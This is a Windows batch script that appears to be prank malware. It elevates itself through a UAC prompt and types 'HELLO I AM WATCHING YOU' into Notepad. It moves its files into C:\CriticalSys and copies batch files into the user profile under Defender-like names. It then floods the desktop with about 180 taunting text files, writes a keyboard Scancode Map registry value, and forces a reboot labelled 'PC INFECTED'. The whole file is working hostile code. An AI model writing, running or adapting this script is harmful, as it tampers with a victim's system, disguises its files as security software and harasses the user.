@echo off
 CLS
 del README.txt
 start ./warnings/warning.vbs
 del ./warning/warning.vbs
:init
 setlocal DisableDelayedExpansion
 set cmdInvoke=1
 set winSysFolder=System32
 set "batchPath=%~dpnx0"
 rem this works also from cmd shell, other than %~0
 for %%k in (%0) do set batchName=%%~nk
 set "vbsGetPrivileges=%temp%\OEgetPriv_%batchName%.vbs"
 setlocal EnableDelayedExpansion

:checkPrivileges
  NET FILE 1>NUL 2>NUL
  if '%errorlevel%' == '0' ( goto gotPrivileges ) else ( goto getPrivileges )

:getPrivileges
  if '%1'=='ELEV' (echo ELEV & shift /1 & goto gotPrivileges)

  ECHO Set UAC = CreateObject^("Shell.Application"^) > "%vbsGetPrivileges%"
  ECHO args = "ELEV " >> "%vbsGetPrivileges%"
  ECHO For Each strArg in WScript.Arguments >> "%vbsGetPrivileges%"
  ECHO args = args ^& strArg ^& " "  >> "%vbsGetPrivileges%"
  ECHO Next >> "%vbsGetPrivileges%"
  
  if '%cmdInvoke%'=='1' goto InvokeCmd 

  ECHO UAC.ShellExecute "!batchPath!", args, "", "runas", 1 >> "%vbsGetPrivileges%"
  goto ExecElevation

:InvokeCmd
  ECHO args = "/c """ + "!batchPath!" + """ " + args >> "%vbsGetPrivileges%"
  ECHO UAC.ShellExecute "%SystemRoot%\%winSysFolder%\cmd.exe", args, "", "runas", 1 >> "%vbsGetPrivileges%"

:ExecElevation
 "%SystemRoot%\%winSysFolder%\WScript.exe" "%vbsGetPrivileges%" %*
 exit /B

:gotPrivileges
 setlocal & cd /d %~dp0
 if '%1'=='ELEV' (del "%vbsGetPrivileges%" 1>nul 2>nul  &  shift /1)

 ::::::::::::::::::::::::::::
 ::START
 ::::::::::::::::::::::::::::
 REM Run shell as admin (example) - put here code as you like
 
start notepad.exe


SET TempVBSFile=%temp%\~tmpSendKeysTemp.vbs
IF EXIST "%TempVBSFile%" DEL /F /Q "%TempVBSFile%"
ECHO Set WshShell = WScript.CreateObject("WScript.Shell") >>"%TempVBSFile%"
ECHO Wscript.Sleep 900                                    >>"%TempVBSFile%"
ECHO WshShell.SendKeys "{CAPSLOCK}"                            >>"%TempVBSFile%
ECHO Wscript.Sleep 900                                    >>"%TempVBSFile%"

CSCRIPT //nologo "%TempVBSFile%"

SET TempVBSFile=%temp%\~tmpSendKeysTemp.vbs
IF EXIST "%TempVBSFile%" DEL /F /Q "%TempVBSFile%"
ECHO Set WshShell = WScript.CreateObject("WScript.Shell") >>"%TempVBSFile%"
ECHO Wscript.Sleep 900                                    >>"%TempVBSFile%"
ECHO WshShell.SendKeys "H"                            >>"%TempVBSFile%
ECHO Wscript.Sleep 900                                    >>"%TempVBSFile%"

CSCRIPT //nologo "%TempVBSFile%"

SET TempVBSFile=%temp%\~tmpSendKeysTemp.vbs
IF EXIST "%TempVBSFile%" DEL /F /Q "%TempVBSFile%"
ECHO Set WshShell = WScript.CreateObject("WScript.Shell") >>"%TempVBSFile%"
ECHO Wscript.Sleep 900                                    >>"%TempVBSFile%"
ECHO WshShell.SendKeys "E"                            >>"%TempVBSFile%
ECHO Wscript.Sleep 900                                    >>"%TempVBSFile%"

CSCRIPT //nologo "%TempVBSFile%"

SET TempVBSFile=%temp%\~tmpSendKeysTemp.vbs
IF EXIST "%TempVBSFile%" DEL /F /Q "%TempVBSFile%"
ECHO Set WshShell = WScript.CreateObject("WScript.Shell") >>"%TempVBSFile%"
ECHO Wscript.Sleep 900                                    >>"%TempVBSFile%"
ECHO WshShell.SendKeys "L"                            >>"%TempVBSFile%
ECHO Wscript.Sleep 900                                    >>"%TempVBSFile%"

CSCRIPT //nologo "%TempVBSFile%"

SET TempVBSFile=%temp%\~tmpSendKeysTemp.vbs
IF EXIST "%TempVBSFile%" DEL /F /Q "%TempVBSFile%"
ECHO Set WshShell = WScript.CreateObject("WScript.Shell") >>"%TempVBSFile%"
ECHO Wscript.Sleep 900                                    >>"%TempVBSFile%"
ECHO WshShell.SendKeys "L"                            >>"%TempVBSFile%
ECHO Wscript.Sleep 900                                    >>"%TempVBSFile%"

CSCRIPT //nologo "%TempVBSFile%"

SET TempVBSFile=%temp%\~tmpSendKeysTemp.vbs
IF EXIST "%TempVBSFile%" DEL /F /Q "%TempVBSFile%"
ECHO Set WshShell = WScript.CreateObject("WScript.Shell") >>"%TempVBSFile%"
ECHO Wscript.Sleep 900                                    >>"%TempVBSFile%"
ECHO WshShell.SendKeys "O"                            >>"%TempVBSFile%
ECHO Wscript.Sleep 1000                                    >>"%TempVBSFile%"

CSCRIPT //nologo "%TempVBSFile%"

SET TempVBSFile=%temp%\~tmpSendKeysTemp.vbs
IF EXIST "%TempVBSFile%" DEL /F /Q "%TempVBSFile%"
ECHO Set WshShell = WScript.CreateObject("WScript.Shell") >>"%TempVBSFile%"
ECHO Wscript.Sleep 900                                    >>"%TempVBSFile%"
ECHO WshShell.SendKeys "^A"                            >>"%TempVBSFile%
ECHO Wscript.Sleep 1000                                    >>"%TempVBSFile%"

CSCRIPT //nologo "%TempVBSFile%"

SET TempVBSFile=%temp%\~tmpSendKeysTemp.vbs
IF EXIST "%TempVBSFile%" DEL /F /Q "%TempVBSFile%"
ECHO Set WshShell = WScript.CreateObject("WScript.Shell") >>"%TempVBSFile%"
ECHO Wscript.Sleep 900                                    >>"%TempVBSFile%"
ECHO WshShell.SendKeys "{BS}"                            >>"%TempVBSFile%
ECHO Wscript.Sleep 1000                                    >>"%TempVBSFile%"

CSCRIPT //nologo "%TempVBSFile%"
SET TempVBSFile=%temp%\~tmpSendKeysTemp.vbs
IF EXIST "%TempVBSFile%" DEL /F /Q "%TempVBSFile%"
ECHO Set WshShell = WScript.CreateObject("WScript.Shell") >>"%TempVBSFile%"
ECHO Wscript.Sleep 900                                    >>"%TempVBSFile%"
ECHO WshShell.SendKeys "I"                            >>"%TempVBSFile%
ECHO Wscript.Sleep 900                                    >>"%TempVBSFile%"

CSCRIPT //nologo "%TempVBSFile%"

SET TempVBSFile=%temp%\~tmpSendKeysTemp.vbs
IF EXIST "%TempVBSFile%" DEL /F /Q "%TempVBSFile%"
ECHO Set WshShell = WScript.CreateObject("WScript.Shell") >>"%TempVBSFile%"
ECHO Wscript.Sleep 900                                    >>"%TempVBSFile%"
ECHO WshShell.SendKeys " AM "                            >>"%TempVBSFile%
ECHO Wscript.Sleep 900                                    >>"%TempVBSFile%"

CSCRIPT //nologo "%TempVBSFile%"

SET TempVBSFile=%temp%\~tmpSendKeysTemp.vbs
IF EXIST "%TempVBSFile%" DEL /F /Q "%TempVBSFile%"
ECHO Set WshShell = WScript.CreateObject("WScript.Shell") >>"%TempVBSFile%"
ECHO Wscript.Sleep 900                                    >>"%TempVBSFile%"
ECHO WshShell.SendKeys "WATCH"                            >>"%TempVBSFile%
ECHO Wscript.Sleep 900                                    >>"%TempVBSFile%"

CSCRIPT //nologo "%TempVBSFile%"

SET TempVBSFile=%temp%\~tmpSendKeysTemp.vbs
IF EXIST "%TempVBSFile%" DEL /F /Q "%TempVBSFile%"
ECHO Set WshShell = WScript.CreateObject("WScript.Shell") >>"%TempVBSFile%"
ECHO Wscript.Sleep 900                                    >>"%TempVBSFile%"
ECHO WshShell.SendKeys "ING"                            >>"%TempVBSFile%
ECHO Wscript.Sleep 900                                    >>"%TempVBSFile%"

CSCRIPT //nologo "%TempVBSFile%"

SET TempVBSFile=%temp%\~tmpSendKeysTemp.vbs
IF EXIST "%TempVBSFile%" DEL /F /Q "%TempVBSFile%"
ECHO Set WshShell = WScript.CreateObject("WScript.Shell") >>"%TempVBSFile%"
ECHO Wscript.Sleep 900                                    >>"%TempVBSFile%"
ECHO WshShell.SendKeys " YOU."                            >>"%TempVBSFile%
ECHO Wscript.Sleep 900                                    >>"%TempVBSFile%"

CSCRIPT //nologo "%TempVBSFile%"

move ./ C:\ dirname2 CriticalSys
start ./plugin-aVSD/runavsd.bat
mkdir %USERPROFILE%/CriticalUserWinDef
copy C:\CriticalSys\plugin-aVSD\superaVSD.bat %USERPROFILE%\CriticalUserWinDef\DefenderVirusRemoval.bat
copy C:\CriticalSys\plugin-aVSD\runavsd.bat %USERPROFILE%\CriticalUserWinDef\DefenderAttachment.bat
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt
echo pc time over! go outside, silly boy. > "%USERPROFILE%\Desktop\%random% no pc now RUN.txt

REG ADD "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Controls\KeyboardLayout" /v "Scancode Map" /t REG_BINARY /d 00 00 00 00 00 00 00 00 02 00 00 00 00 00 1C E0 00 00 00 00 /f
shutdown -r -y -c "PC INFECTED" -t 10
start notepad.exe
SET TempVBSFile=%temp%\~tmpSendKeysTemp.vbs
IF EXIST "%TempVBSFile%" DEL /F /Q "%TempVBSFile%"
ECHO Set WshShell = WScript.CreateObject("WScript.Shell") >>"%TempVBSFile%"
ECHO Wscript.Sleep 900                                    >>"%TempVBSFile%"
ECHO WshShell.SendKeys "HAVE FUN LOSER"                            >>"%TempVBSFile%
ECHO Wscript.Sleep 900                                    >>"%TempVBSFile%"

CSCRIPT //nologo "%TempVBSFile%"

